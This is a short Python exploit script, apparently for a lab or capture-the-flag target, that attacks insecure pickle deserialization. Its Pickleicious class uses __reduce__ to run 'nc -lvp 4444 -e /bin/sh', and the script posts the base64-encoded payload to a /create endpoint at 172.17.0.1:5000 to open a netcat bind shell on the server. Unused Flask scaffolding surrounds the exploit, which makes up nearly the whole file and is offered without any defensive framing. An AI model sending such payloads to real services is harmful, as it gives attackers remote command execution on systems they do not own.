import pickle
import os
import requests
import base64
from flask import Flask, render_template, request, redirect, url_for

port = "5000"
ip = "172.17.0.1"

app = Flask(__name__)

class Pickleicious:
    def __reduce__(self):
        return (os.system, ('nc -lvp 4444 -e /bin/sh',))

pickle_data = pickle.dumps(Pickleicious())

encoded_data = base64.b64encode(pickle_data).decode('utf-8')
url = f'http://{ip}:{port}/create'
params = {'data': encoded_data}
response = requests.post(url, data=params)
print(response.text)

if __name__ == '__main__':
    app.run(debug=True, port= 8080)